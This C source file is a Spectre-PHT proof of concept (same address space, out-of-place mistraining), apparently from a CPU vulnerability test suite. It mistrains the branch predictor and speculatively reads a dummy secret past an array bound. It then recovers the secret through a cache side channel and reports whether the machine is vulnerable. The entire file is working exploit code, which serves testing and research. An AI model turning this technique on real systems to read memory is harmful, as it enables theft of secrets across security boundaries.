#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "SECRETSS"

#define likely(x) __builtin_expect((x), 1)
#define unlikely(x) __builtin_expect((x), 0)

#define DATA_SECRET DATA SECRET

unsigned char data[128];

char access_array(int x)
{
    // flushing the data which is used in the condition increases
    // probability of speculation
    size_t len = sizeof(DATA) - 1;
    mfence();
    flush(&len);
    flush(&x);

    // ensure data is flushed at this point
    mfence();

    // check that only accessible part (DATA) can be accessed
    if (unlikely((float)x / (float)len < 1))
    {
        // countermeasure: add the fence here
        // Encode data in cache
        cache_encode(data[x]);
    }
}

volatile int true = 1;

// Span large part of memory with jump if equal
#if defined(__i386__) || defined(__x86_64__)
#define JE asm volatile("je end");
#elif defined(__aarch64__)
#define JE asm volatile("beq end");
#endif
#define JE_16 JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE
#define JE_256 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16
#define JE_4K JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256
#define JE_64K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K

void oop()
{
#if defined(__i386__) || defined(__x86_64__)
    if (!true)
        true ++;
#elif defined(__aarch64__)
    if (true)
        true ++;
#endif
    JE_64K

end:
    return;
}

int main(int argc, const char **argv)
{
    PREPARE();

    // store secret
    memset(data, ' ', sizeof(data));
    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
    // ensure data terminates
    data[sizeof(data) / sizeof(data[0]) - 1] = '0';

    // flush everything
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(DATA_SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(DATA_SECRET)] = 0;

    int j = 0;
    start_time = time(NULL);
    int i;
    for (i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        j = (j + 1) % sizeof(DATA_SECRET);

        // mistrain out of place
        for (int y = 0; y < 100; y++)
        {
            oop();
        }

        mfence(); // avoid speculation
        // out of bounds access
        access_array(j);
        // Recover data from covert channel
        cache_decode_array(leaked, j);
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Spectre_PHT_sa_oop: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    for (i = 0; i < sizeof(SECRET) - 1; i++)
    {
        if (SECRET[i] == leaked[i + sizeof(DATA) - 1])
        {
            passed_count++;
        }
    }
    // puts(leaked);
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_PHT_sa_oop: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_PHT_sa_oop: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}
